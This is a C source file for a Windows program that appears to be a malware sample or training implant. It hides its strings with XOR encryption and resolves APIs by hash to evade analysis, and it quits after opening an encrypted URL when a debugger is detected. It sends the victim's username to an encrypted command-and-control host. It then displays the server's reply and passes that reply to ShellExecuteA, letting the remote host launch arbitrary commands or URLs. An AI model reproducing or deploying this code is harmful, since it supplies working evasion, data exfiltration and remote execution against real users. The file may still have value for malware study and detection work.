#include "resolve.h"
#include "application.h"

#pragma comment(lib, "ws2_32.lib")

__declspec(noinline) BYTE* crypt(BYTE* data, SIZE_T data_size) {
    BYTE key[] = {
        0x51,0x66,0x3d,0x22,
        0x66,0x81,0x9e,0x53,
        0x90,0x41,0xa1,0x86,
        0x47,0x07,0xa3,0x75,
        0xae,0x8a,0xd0,0xb4,
        0xf6,0xf8,0x16,0xa3,
        0x23,0x2f,0x3a,0xfe,
        0x8f,0x10,0x6f,0xf7 };
    for (SIZE_T i = 0; i < data_size; i++) {
        data[i] ^= key[i % 32];
    }
    return data;
}

__declspec(noinline) void AntiDebug() {
    _IsDebuggerPresent IsDebuggerPresent = (_IsDebuggerPresent)resolve_api(0x72d1dd1f, 0xdc248bb1);
    if (IsDebuggerPresent() == TRUE) {
        _ShellExecuteA ShellExecuteA = (_ShellExecuteA)resolve_api(0x332c14d6, 0xe7b1d6fb);
        BYTE url[] = {
           0x39,0x12,0x49,0x52,0x15,0xbb,0xb1,
           0x7c,0xe7,0x36,0xd6,0xa8,0x3e,0x68,
           0xd6,0x01,0xdb,0xe8,0xb5,0x9a,0x95,
           0x97,0x7b,0x8c,0x54,0x4e,0x4e,0x9d,
           0xe7,0x2f,0x19,0xca,0x35,0x37,0x4a,
           0x16,0x11,0xb8,0xc9,0x34,0xc8,0x22,
           0xf0,0x86 };
        ShellExecuteA(0, 0, (LPCSTR)crypt((BYTE*)&url, sizeof(url)), 0, 0, SW_SHOW);
        _ExitProcess ExitProcess = (_ExitProcess)resolve_api(0x72d1dd1f, 0x349aa368);
        ExitProcess(ERROR_SUCCESS);
    }
}

__declspec(noinline) void LoadModules() {
    BYTE shell32_dll[] = {
        0x22,0x0e,0x58,0x4e,
        0x0a,0xb2,0xac,0x7d,
        0xf4,0x2d,0xcd,0x86 };
    crypt((BYTE*)&shell32_dll, sizeof(shell32_dll));
    resolve_loadlibrarya((LPCSTR)&shell32_dll);
    BYTE advapi32_dll[] = {
        0x30,0x02,0x4b,0x43,
        0x16,0xe8,0xad,0x61,
        0xbe,0x25,0xcd,0xea,
        0x47 };
    crypt((BYTE*)&advapi32_dll, sizeof(advapi32_dll));
    resolve_loadlibrarya((LPCSTR)advapi32_dll);
    BYTE ws2_32_dll[] = { 0x06,0x35,0x0f,0x7d,0x55,0xb3,0xb0,0x17,0xdc,0x0d,0xa1 };
    crypt((BYTE*)&ws2_32_dll, sizeof(ws2_32_dll));
    resolve_loadlibrarya((LPCSTR)ws2_32_dll);
    BYTE user32_dll[] = { 0x04,0x35,0x78,0x70,0x55,0xb3,0xb0,0x17,0xdc,0x0d,0xa1 };
    resolve_loadlibrarya((LPCSTR)crypt((BYTE*)&user32_dll, sizeof(user32_dll)));
    _WSAStartup WSAStartup = (_WSAStartup)resolve_api(0xd1715899, 0xab737cd);
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
}

__declspec(noinline) LPCSTR thunk_GetUserNameA() {
    _VirtualAlloc VirtualAlloc = (_VirtualAlloc)resolve_api(0x72d1dd1f, 0x3cc5bbc1);
    LPSTR username = (LPSTR)VirtualAlloc(NULL, 256, MEM_COMMIT, PAGE_READWRITE);
    DWORD username_length = 256;
    _GetUserNameA GetUserNameA = (_GetUserNameA)resolve_api(0x5c81f033, 0x10801670);
    BOOL result = GetUserNameA(username, &username_length);
    if (result == NULL){
        return NULL;
    }
    return username;
}

__declspec(noinline) BYTE* SendC2Data(BYTE* data, SIZE_T data_size) {

    int iResult;
    struct addrinfo* result = NULL, * ptr = NULL, hints;

    resolve_zero_memory((BYTE*)&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    BYTE domain[] = { 0x25,0x03,0x4f,0x4f,0x04,0xe8,0xf0,0x7d,0xf3,0x2e,0xcc,0x86 };
    crypt((BYTE*)&domain, sizeof(domain));
    BYTE port[] = { 0x68,0x5f,0x04,0x1b,0x66 };
    crypt((BYTE*)&port, sizeof(port));
    _getaddrinfo getaddrinfo = (_getaddrinfo)resolve_api(0xd1715899, 0x6c546e76);
    iResult = getaddrinfo((PCSTR)domain, (PCSTR)port, &hints, &result);
    if (iResult != 0) {
        return NULL;
    }

    SOCKET sock;
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        if (ptr->ai_family == AF_INET) {
            _socket socket = (_socket)resolve_api(0xd1715899, 0xcbffdb78);
            sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
            if (sock == INVALID_SOCKET) {
                continue;
            }
            _connect connect = (_connect)resolve_api(0xd1715899, 0x3e151ed9);
            int c = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
            if (c == SOCKET_ERROR) {
                _closesocket closesocket = (_closesocket)resolve_api(0xd1715899, 0xc6202b8e);
                closesocket(sock);
                continue;
            }
            break;
        }
    }

    if (sock == INVALID_SOCKET) {
        _freeaddrinfo freeaddrinfo = (_freeaddrinfo)resolve_api(0xd1715899, 0x7f6385d8);
        freeaddrinfo(result);
        return NULL;
    }

    _send send = (_send)resolve_api(0xd1715899, 0x7afab799);
    int iSendResult = send(sock, (const char*)data, data_size, 0);

    if (iSendResult == SOCKET_ERROR) {
        _closesocket closesocket = (_closesocket)resolve_api(0xd1715899, 0xc6202b8e);
        closesocket(sock);
        return NULL;
    }

    char recvbuf[26];

    resolve_zero_memory((BYTE*)&recvbuf, 26);

    _recv recv = (_recv)resolve_api(0xd1715899, 0x78e5af9f);
    int iRecvResult = recv(sock, (char*)&recvbuf, 26, 0);

    if (iRecvResult <= 0) {
        return NULL;
    }

    recvbuf[25] = 0x00;

    BYTE title[] = { 0x18,0x46,0x6e,0x56,0x09,0xed,0xfb,0x73,0xc9,0x2e,0xd4,0xf4,0x67,0x43,0xe2,0x21,0xef,0xab,0xd0 };
    crypt((BYTE*)&title, sizeof(title));

    _MessageBoxA MessageBoxA = (_MessageBoxA)resolve_api(0x6aca3cfd, 0xc53f01e);
    int iChoice = MessageBoxA(NULL, (LPCSTR)recvbuf, (LPCSTR)title, MB_OKCANCEL);
    if (iChoice == IDOK) {
        _ShellExecuteA ShellExecuteA = (_ShellExecuteA)resolve_api(0x332c14d6, 0xe7b1d6fb);
        ShellExecuteA(0, 0, (LPCSTR)recvbuf, 0, 0, SW_SHOW);
    }

    _closesocket closesocket = (_closesocket)resolve_api(0xd1715899, 0xc6202b8e);
    closesocket(sock);

    _freeaddrinfo freeaddrinfo = (_freeaddrinfo)resolve_api(0xd1715899, 0x7f6385d8);
    freeaddrinfo(result);

    return data;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    LoadModules();
    
    AntiDebug();

    _VirtualAlloc VirtualAlloc = (_VirtualAlloc)resolve_api(0x72d1dd1f, 0x3cc5bbc1);
    LPSTR message = (LPSTR)VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);

    resolve_zero_memory((BYTE*)message, 1024);

    BYTE hello[] = { 0x19,0x03,0x51,0x4e,0x09,0xad,0xbe,0x53 };

    crypt((BYTE*)&hello, sizeof(hello));

    resolve_strcata(message, (char *)hello, 1024);

    LPCSTR username = thunk_GetUserNameA();

    resolve_strcata(message, (char *)username, 1024);

    _VirtualFree VirtualFree = (_VirtualFree)resolve_api(0x72d1dd1f, 0x85ac6258);
    VirtualFree((LPVOID)username, 0, MEM_RELEASE);

    BYTE iseeyou[] = { 0x71,0x2f,0x1d,0x51,0x03,0xe4,0xbe,0x2a,0xff,0x34,0x81,0xbd,0x6e,0x07 };

    crypt((BYTE*)&iseeyou, sizeof(iseeyou));

    resolve_strcata(message, (char *)iseeyou, 1024);

    SendC2Data((BYTE *)message, resolve_strlena(message));

    VirtualFree((LPVOID)message, 0, MEM_RELEASE);

    _WSACleanup WSACleanup = (_WSACleanup)resolve_api(0xd1715899, 0x54c4a1a2);
    WSACleanup();

	return 0;
}
